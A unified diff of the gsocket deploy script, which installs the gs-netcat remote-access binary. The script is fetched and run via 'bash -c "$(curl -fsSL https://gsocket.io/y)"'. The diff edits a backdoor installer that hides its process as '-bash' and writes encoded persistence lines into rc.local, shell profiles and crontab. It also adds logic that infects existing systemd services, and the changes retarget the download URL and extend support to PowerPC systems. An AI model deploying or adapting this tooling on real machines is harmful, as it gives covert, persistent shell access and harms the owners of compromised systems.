@@ -5,14 +5,14 @@
 # See https://www.gsocket.io/deploy/ for examples.
 #
 # This script is typically invoked like this as root or non-root user:
-#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
+#   $ bash -c "$(curl -fsSL https://gsocket.io/y)"
 #
 # Connect
-#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
+#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/y)"
 # Pre-set a secret:
-#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
+#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/y)"
 # Uninstall
-#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
+#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/y)"
 #
 # Other variables:
 # GS_DEBUG=1
@@ -29,7 +29,7 @@
 #       - Do not start gs-netcat (for testing purpose only)
 # GS_NOINST=1
 #		- Do not install gsocket
-# GS_OSARCH=x86_64-alpine
+# GS_OSARCH=linux-x86_64
 #       - Force architecutre to a specific package (for testing purpose only)
 # GS_PREFIX=
 #		- Use 'path' instead of '/' (needed for packaging/testing)
@@ -65,7 +65,7 @@
 #       - See https://github.com/hackerschoice/gsocket-relay
 # GS_PORT=
 #       - Port for the GSRN-Server. Default is 443.
-# TMPDIR=
+# _GS_TMPDIR=
 #       - Guess what...
 
 # Global Defines
@@ -74,6 +74,19 @@
 
 URL_BASE_CDN="https://cdn.gsocket.io"
 URL_BASE_X="https://gsocket.io"
+
+# -----BEGIN deploy_server.sh HOOK-----
+# These stubs are filled out by deploy_server.sh:
+IS_DEPLOY_SERVER=
+URL_BASE=
+[[ -n $URL_BASE ]] && [[ -z $GS_URL_BASE ]] && GS_URL_BASE="$URL_BASE"
+[[ -n $IS_DEPLOY_SERVER ]] && unset GS_BRANCH
+gs_deploy_webhook=
+GS_WEBHOOK_404_OK=
+[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
+unset gs_deploy_webhook
+# -----END deploy_server.sh HOOK-----
+
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
@@ -89,12 +102,6 @@ URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
 	URL_BIN_FULL="$URL_BIN"
 }
 [[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/x"
-
-# STUBS for deploy_server.sh to fill out:
-gs_deploy_webhook=
-GS_WEBHOOK_404_OK=
-[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
-unset gs_deploy_webhook
 
 # WEBHOOKS are executed after a successfull install
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
@@ -349,7 +356,9 @@ _ts_add()
 
 # Return 0 if not yet marked. Error if already marked.
 _ts_add_pdir() {
-	local pdir="$(dirname "${1:?}")"
+	local pdir
+
+	pdir="$(dirname "${1:?}")"
 	ts_is_marked "$pdir" && return 200
 
 	_ts_add "$pdir" "<NOT BY ADD_PDIR>"
@@ -477,9 +486,9 @@ xmv() {
 
 clean_all()
 {
-	[[ "${#TMPDIR}" -gt 5 ]] && {
-		rm -rf "${TMPDIR:?}/"*
-		rmdir "${TMPDIR}"
+	[[ "${#_GS_TMPDIR}" -gt 5 ]] && {
+		rm -rf "${_GS_TMPDIR:?}/"*
+		rmdir "${_GS_TMPDIR}"
 	} &>/dev/null
 
 	ts_restore
@@ -578,11 +587,11 @@ init_dstbin()
 
 try_tmpdir()
 {
-	[[ -n $TMPDIR ]] && return # already set
+	[[ -n $_GS_TMPDIR ]] && return # already set
 
 	[[ ! -d "$1" ]] && return
 
-	[[ -d "$1" ]] && xmkdir "${1}/${2}" && TMPDIR="${1}/${2}"
+	[[ -d "$1" ]] && xmkdir "${1}/${2}" && _GS_TMPDIR="${1}/${2}"
 }
 
 try_encode()
@@ -619,6 +628,14 @@ is_le()
 	return 255
 }
 
+# Return 0 (TRUE) if it is 64 bit arch. Default is FALSE (32bit)
+is_64bit() {
+	command -v getconf >/dev/null && [[ "$(getconf LONG_BIT)" == "64" ]] && return 0
+	command -v lscpu >/dev/null && [[ "$(lscpu)" == *"64-bit"* ]] && return 0
+	command -v uname >/dev/null && [[ "$(uname -m)" == *"64"* ]] && return 0
+	return 255		
+}
+
 init_vars()
 {
 	# Select binary
@@ -634,6 +651,9 @@ init_vars()
 
 	# set PWD if not set
 	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"
+
+	[[ "$GS_BEACON" -eq 0 ]] && unset GS_BEACON
+	[[ "$GS_DEBUG" -eq 0 ]] && unset GS_DEBUG
 
 	[[ -z "$OSTYPE" ]] && {
 		local osname
@@ -657,7 +677,7 @@ init_vars()
 	if [[ -z "$OSARCH" ]]; then
 		if [[ $OSTYPE == *linux* ]]; then 
 			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
-				OSARCH="i386-alpine"
+				OSARCH="i386-linux"
 				SRC_PKG="gs-netcat_mini-linux-i686"
 			elif [[ "$arch" == *"armv6"* ]]; then
 				OSARCH="arm-linux"
@@ -672,20 +692,36 @@ init_vars()
 				OSARCH="aarch64-linux"
 				SRC_PKG="gs-netcat_mini-linux-aarch64"
 			elif [[ "$arch" == "mips64" ]]; then
-				OSARCH="mips64-alpine"
+				OSARCH="mips64-linux"
 				SRC_PKG="gs-netcat_mini-linux-mips64"
 				# Go 32-bit if Little Endian even if 64bit arch
 				is_le && {
-					OSARCH="mipsel32-alpine"
+					OSARCH="mipsel32-linux"
 					SRC_PKG="gs-netcat_mini-linux-mipsel"
 				}
 			elif [[ "$arch" == *mips* ]]; then
-				OSARCH="mips32-alpine"
+				OSARCH="mips32-linux"
 				SRC_PKG="gs-netcat_mini-linux-mips32"
 				is_le && {
-					OSARCH="mipsel32-alpine"
+					OSARCH="mipsel32-linux"
 					SRC_PKG="gs-netcat_mini-linux-mipsel"
 				}
+			elif [[ "$arch" == *"ppc"* ]]; then
+				if is_64bit; then
+					OSARCH="powerpc64-linux"
+					SRC_PKG="gs-netcat_mini-linux-powerpc64"
+					is_le && {
+						OSARCH="powerpc64le-linux"
+						SRC_PKG="gs-netcat_mini-linux-powerpc64le"
+					}
+				else
+					OSARCH="powerpc-linux"
+					SRC_PKG="gs-netcat_mini-linux-powerpc"
+					is_le && {
+						OSARCH="powerpcle-linux"
+						SRC_PKG="gs-netcat_mini-linux-powerpcle"
+					}
+				fi
 			fi
 		elif [[ $OSTYPE == *darwin* ]]; then
 			if [[ "$arch" == "arm64" ]]; then
@@ -712,7 +748,7 @@ init_vars()
 
 		[[ -z "$OSARCH" ]] && {
 			# Default: Try Alpine(muscl libc) 64bit
-			OSARCH="x86_64-alpine"
+			OSARCH="x86_64-linux"
 			SRC_PKG="gs-netcat_mini-linux-x86_64"
 		}
 	fi
@@ -725,7 +761,7 @@ init_vars()
 	try_encode "base64" "base64 -w0" "base64 -d"
 	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
-	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
+	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_mini-${OSARCH}.tar.gz"
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not use pkill all -bash.
@@ -866,11 +902,14 @@ mk_encode()
 
 init_setup()
 {
+	unset _GS_TMPDIR
 	[[ -n $TMPDIR ]] && try_tmpdir "${TMPDIR}" ".gs-${UID}"
 	try_tmpdir "/dev/shm" ".gs-${UID}"
+	try_tmpdir "/var/tmp" ".gs-${UID}"
 	try_tmpdir "/tmp" ".gs-${UID}"
 	try_tmpdir "${HOME}" ".gs"
 	try_tmpdir "$(pwd)" ".gs-${UID}"
+	[[ -z $_GS_TMPDIR ]] && errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR="
 
 	if [[ -n "$GS_PREFIX" ]]; then
 		# Debuggin and testing into separate directory
@@ -882,12 +921,6 @@ init_setup()
 		fi
 		cp -p /etc/rc.local "${GS_PREFIX}/etc/"
 	fi
-
-	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
-	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"
-
-	touch "${TMPDIR}/.gs-rw.lock" || errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR="
-	rm -f "${TMPDIR}/.gs-rw.lock" 2>/dev/null
 
 	# Find out which directory is writeable
 	init_dstbin
@@ -906,7 +939,6 @@ init_setup()
 	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || '${DSTBIN}' 2>/dev/null"
 	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || '${DSTBIN}' 2>/dev/null"
 
-
 	if [[ -n $ENCODE_STR ]]; then
 		RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
 		PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
@@ -916,7 +948,7 @@ init_setup()
 	# DEBUGF "RCLOCAL_LINE=${RCLOCAL_LINE}"
 	# DEBUGF "PROFILE_LINE=${PROFILE_LINE}"
 	# DEBUGF "CRONTAB_LINE=${CRONTAB_LINE}"
-	DEBUGF "TMPDIR=${TMPDIR}"
+	DEBUGF "_GS_TMPDIR=${_GS_TMPDIR}"
 	DEBUGF "DSTBIN=${DSTBIN}"
 }
 
@@ -1044,9 +1076,9 @@ uninstall()
 	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
 	uninstall_rmdir "/tmp/.gsusr-${UID}"
 
-	uninstall_rm "${TMPDIR}/${SRC_PKG}"
-	uninstall_rm "${TMPDIR}/._gs-netcat" # OLD
-	uninstall_rmdir "${TMPDIR}"
+	uninstall_rm "${_GS_TMPDIR}/${SRC_PKG}"
+	uninstall_rm "${_GS_TMPDIR}/._gs-netcat" # OLD
+	uninstall_rmdir "${_GS_TMPDIR}"
 
 	# Remove crontab
 	unset regex
@@ -1121,7 +1153,7 @@ WARN_EXECFAIL()
 	ls -al "${DSTBIN}"
 	echo -e "${CN}--> ${WARN_EXECFAIL_MSG}
 --> GS_OSARCH=${OSARCH}
---> ${CDC}GS_DSTDIR=${DSTBIN%/*}${CN}
+--> GS_DSTDIR=${DSTBIN%/*}
 --> Try to set ${CDC}export GS_DEBUG=1${CN} and deploy again.
 --> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.
 --> Alternatively, try the static binary from
@@ -1348,7 +1380,7 @@ install_systemd_infect() {
 	INFECTED_BIN_NAME="${bin}"
 	IS_SYSTEMD=1
 	((IS_INSTALLED+=1))
-	OK_OUT
+	OK_OUT "Experimental. Set GS_NOINFECT=1 to disable."
 	# FIXME: It would be better if I do this BEFORE installing the service or otherwise we can not
 	# recover if this fails:
 	do_config2bin "${DSTBIN}" "${bin}" "-liq" "" || return 255
@@ -1361,11 +1393,15 @@ install_system_systemd()
 	local i
 	[[ ! -d "${SERVICE_DIR}" ]] && return 255
 	command -v systemctl >/dev/null || return 255
+	[[ -n "$IS_INSTALLED" ]] && return 0
 
 	# test for:
 	# 1. offline
 	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
-	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return
+	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return 255
+
+	# printf "%-70.70s" "Infecting systemd service....................................................................."
+	# SKIP_OUT "GS_NOINFECT=1 is set"
 
 	if [[ -n $GS_INFECT ]]; then
 		i=0
@@ -1373,16 +1409,12 @@ install_system_systemd()
 			install_systemd_infect "${INFECT_SYSCTL_NAME_ARR[$i]}" "${INFECT_BIN_NAME_ARR[$i]}"
 			((i++))
 		done
-	else
-		printf "%-70.70s" "Infecting systemd service....................................................................."
-		SKIP_OUT "GS_INFECT=1 not set"
+		[[ -n "$IS_INSTALLED" ]] && {
+			xrm "${DSTBIN}"
+			unset DSTBIN
+			return 0
+		}
 	fi
-
-	[[ -n "$IS_INSTALLED" ]] && {
-		xrm "${DSTBIN}"
-		unset DSTBIN
-		return 0
-	}
 
 	install_systemd_new
 	[[ -n "$IS_INSTALLED" ]] && return 0
@@ -1770,6 +1802,7 @@ try_network()
 	FAIL_OUT
 	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
 	WARN_EXECFAIL
+	errexit
 }
 
 # install <osarch> <srcpackage>
@@ -1782,25 +1815,26 @@ install()
 	echo -e "--> Trying ${CG}${osarch}${CN}"
 	# Download binaries
 	echo -en "Downloading binaries.................................................."
-	dl "${src_pkg}" "${TMPDIR}/${src_pkg}"
+	dl "${src_pkg}" "${_GS_TMPDIR}/${src_pkg}"
 	OK_OUT
 
 	echo -en "Unpacking binaries...................................................."
 	if [[ "${src_pkg}" == *.tar.gz ]]; then
 		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
-		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
-		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
+		command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
+		(cd "${_GS_TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
+		[[ -f "${_GS_TMPDIR}/._gs-netcat" ]] && rm -f "${_GS_TMPDIR}/._gs-netcat" # from docker???
 		[[ -n $GS_USELOCAL_GSNC ]] && {
 			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
-			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
+			xcp "${GS_USELOCAL_GSNC}" "${_GS_TMPDIR}/gs-netcat"
 		}
 	else
-		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-netcat"
+		mv "${_GS_TMPDIR}/${src_pkg}" "${_GS_TMPDIR}/gs-netcat"
 	fi
 	OK_OUT
 
 	echo -en "Copying binaries......................................................"
-	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
+	xmv "${_GS_TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
 	chmod 700 "$DSTBIN"
 	OK_OUT
 
@@ -1810,7 +1844,7 @@ install()
 		OK_OUT
 		return
 	fi
-	rm -f "${TMPDIR}/${src_pkg:?}"
+	rm -f "${_GS_TMPDIR}/${src_pkg:?}"
 }
 
 gs_start_systemd()
@@ -1906,7 +1940,7 @@ init_vars
 init_setup
 [[ -n $GS_BRANCH ]] && WARN "Using branch ${CDY}$GS_BRANCH${CN}"
 
-# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/y)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ -z $S ]]; then
